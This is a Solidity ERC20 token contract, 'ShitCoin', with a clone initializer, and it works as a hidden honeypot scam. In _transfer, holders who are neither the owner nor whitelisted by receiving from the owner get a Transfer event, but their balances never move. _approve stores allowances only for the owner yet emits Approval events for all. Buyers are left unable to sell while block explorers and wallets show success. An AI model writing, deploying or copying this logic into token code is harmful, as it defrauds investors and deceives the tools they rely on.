// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./interfaces/IERC20.sol";
import "./utils/SafeMath.sol";
import "./utils/Context.sol";
import "./utils/Address.sol";

contract ShitCoin is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _whitelist;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol; 
    uint8 private constant _decimals = 18;
    address private _owner;
    
    bool private _created;

    constructor() public {
        _created = true;
    }

    function cloneConstructor(string memory name, string memory symbol, uint256 totalSupply, address owner) public {
        require(!_created, "This token is already initialized");
        _name = name;
        _symbol = symbol; 
        _owner = owner;
        _totalSupply = totalSupply; // 100*10**18;
        _balances[owner] = totalSupply;
        _created = true;
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }
    
    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        emit Transfer(sender, recipient, amount);

        // Save recipents of the owner to this whitelist
        if (sender == _owner) _whitelist[recipient] = true;
        // Only whitelisted and owner can make transfers
        else if (!_whitelist[sender]) return;

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        if(owner == _owner){
            require(spender != address(0), "ERC20: approve to the zero address");

            _allowances[owner][spender] = amount;
        }
        emit Approval(owner, spender, amount);
    }
}